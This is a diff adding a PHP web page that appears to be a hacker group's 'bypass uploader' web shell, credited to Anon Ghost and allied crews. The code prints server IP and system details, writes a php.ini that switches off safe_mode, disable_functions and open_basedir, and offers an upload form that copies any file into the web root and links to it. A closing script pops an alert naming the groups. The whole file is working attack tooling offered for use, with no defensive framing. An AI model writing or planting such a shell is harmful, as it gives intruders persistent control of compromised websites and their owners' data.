@@ -1,0 +1,129 @@
+<html>
+<head>
+<title>
+ANON GHOST BYPASS UPLOADERS
+</title>
+
+<meta name="keywords" content="ANON GHOST TEAM , GHOST SQUAD HACKERS , BLACK CODERS ANONYMOUS , 22XPLOITER CREW">
+
+<meta name="description" content="ANON GHOST TEAM">
+
+<meta name="rating" content="General">
+
+<meta name="revisit-after" content="1 days">
+
+<meta name="classification" content="AUTHOR BLACK CODERS XPLOITER CREW AND ANON GHOST">
+
+<meta name="robots schedule" content="auto">
+
+<style type='text/css'>
+@import url(https://fonts.googleapis.com/css?family=Aldrich);
+
+html {
+background: black;
+color: #58FAF4;
+font-family: 'Aldrich';
+font-size: 13px;
+width: 100%;
+}
+
+table, th, td {
+border-collapse:collapse;
+font-family: 'Aldrich';
+background: transparent;
+font-family: 'Aldrich';
+font-size: 13px;
+}
+
+input[type=submit] , input {
+background: transparent; 
+color: #58FAF4; 
+height: 24px;
+border: 2px solid #58FAF4; 
+margin: 5px auto;
+padding-left: 5px;
+font-family: 'Aldrich';
+font-size: 13px;
+}
+</style>
+</head>
+
+<center>
+<a href="https://i.ibb.co/CKcvLgk/20190912-184751.jpg">
+<img src='https://i.ibb.co/CKcvLgk/20190912-184751.jpg' width='700' align='center'>
+</a>
+
+<br>
+
+<?php
+error_reporting(E_ALL ^ (E_NOTICE | E_WARNING)); 
+$show_ds = (!empty($ds)) ? "<font color=red>$ds</font>" : "<font color=red>NONE</font>";
+
+echo "<b><font color='#58FAF4'><br>SERVER IP : ".gethostbyname($_SERVER['HTTP_HOST'])."</b></font>";
+
+echo "<b><font color='#58FAF4'><br>".php_uname()."</b></font><br>";
+
+echo "<b><font color='#58FAF4'>DISABLE FUNCTIONS : $show_ds</b></font><br><br>";
+
+echo "<form method='post'>
+<input type='submit' name='funct' value='BYPASS DISABLED FUNCTIONS'>
+</form>";
+
+if($_POST['funct']) {
+$file = 'php.ini';
+file_put_contents($file,'safe_mode = OFF
+disable_functions = NONE
+safe_mode_gid = OFF
+open_basedir = OFF');
+echo "<font color='red'>
+BYPASSED
+</font>";
+}
+
+echo "<font color='#58FAF4'>
+<form method='post' enctype='multipart/form-data'>
+<input type='file' name='file'>
+<br>
+<input type='submit' name='upload' value='EXECUTE'>
+</form>";
+$root = $_SERVER['DOCUMENT_ROOT'];
+$files = $_FILES['file']['name'];
+$dest = $root.'/'.$files;
+if(isset($_POST['upload'])) {
+
+if(is_writable($root)) {
+
+if(@copy($_FILES['file']['tmp_name'], $dest)) {
+
+$web = "http://".$_SERVER['HTTP_HOST']."/";
+
+echo "UPLOAD SUCCESS , FILE LOCATION AT => <a href='$web/$files' target='_blank'><b><u>$web/$files</u></b></a>";
+
+} else {
+echo "UPLOAD FAILED";
+}
+
+} else {
+if(@copy($_FILES['file']['tmp_name'], $files)) {
+
+echo "SUCCESS <b>$files</b> AT FOLDER";
+
+} else {
+
+echo "OWHHH SHIT UPLOAD FAILED MAN!!!";
+}
+}
+}
+?>
+
+<script>alert('ANON GHOST TEAM // GHOST SQUAD HACKERS // BLACK CODERS ANONYMOUS // 22XPLOITER CREW // SILEN GHOST TEAM')</script>
+
+<b>
+<font face='Aldrich' color='#58FAF4' size='4px'>
+<br>
+POWERED &COPY; 2K15
+<br>
+ANON GHOST TEAM AND GHOST SQUAD HACKERS
+</font>
+</b>
+</html>
